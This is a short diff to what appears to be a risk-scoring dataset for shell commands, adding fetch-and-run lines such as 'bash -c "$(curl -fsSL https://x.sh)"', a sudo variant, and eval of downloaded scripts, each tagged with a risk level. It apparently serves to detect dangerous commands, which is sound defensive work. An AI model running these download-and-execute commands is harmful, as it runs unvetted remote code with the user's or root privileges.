@@ -279,3 +279,11 @@ R3	source <(curl -s https://x.sh)
 R3	. <(curl -s https://x.sh)	
 R1	source ~/.bashrc	
 R0	\ls -la	
+R3	bash -c "$(curl -fsSL https://x.sh)"	
+R3	sh -c "$(wget -qO- https://x.sh)"	
+R4	sudo sh -c "$(curl -fsSL https://x.sh)"	
+R3	eval "$(curl -s https://x.sh)"	
+R3	curl -s https://x.sh | source /dev/stdin	
+R3	curl --proto "=https" -sSf https://sh.rustup.rs | sh -s -- -y	
+R1	eval "$(ssh-agent -s)"	
+R1	bash deploy.sh "$(curl -s ip.me)"	
